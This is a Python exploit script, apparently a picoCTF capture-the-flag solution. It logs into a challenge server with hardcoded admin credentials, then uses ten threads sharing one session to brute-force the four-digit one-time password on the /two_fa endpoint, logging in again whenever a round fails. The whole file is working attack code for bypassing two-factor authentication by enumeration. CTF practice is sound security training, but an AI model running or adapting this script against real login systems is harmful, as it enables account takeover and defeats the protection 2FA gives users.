import requests
import time
import threading

TARGET = "http://foggy-cliff.picoctf.net:57418"
found = threading.Event()
NUM_THREADS = 10

def do_login():
    s = requests.Session()
    s.post(f"{TARGET}/login",
           data={"username": "admin", "password": "apple@123"},
           allow_redirects=False)
    print("[+] Logged in, launching threads...")
    return s

def brute_chunk(s, start_otp, end_otp):
    for otp in range(start_otp, end_otp):
        if found.is_set():
            return
        r = s.post(f"{TARGET}/two_fa", data={"otp": str(otp)}, allow_redirects=True)
        if "Login successful" in r.text or "flag" in r.text.lower():
            print(f"[+] OTP found: {otp}")
            print(r.text)
            found.set()
            return
        if otp % 50 == 0:
            print(f"[-] Thread checking {otp}...")

while not found.is_set():
    s = do_login()  # ONE shared session = ONE shared OTP
    chunk = 9000 // NUM_THREADS
    threads = []

    for i in range(NUM_THREADS):
        start = 1000 + i * chunk
        end = start + chunk
        t = threading.Thread(target=brute_chunk, args=(s, start, end))
        threads.append(t)

    for t in threads:
        t.start()
    for t in threads:
        t.join(timeout=110)

    if not found.is_set():
        print("[!] Not found this round, re-logging in...")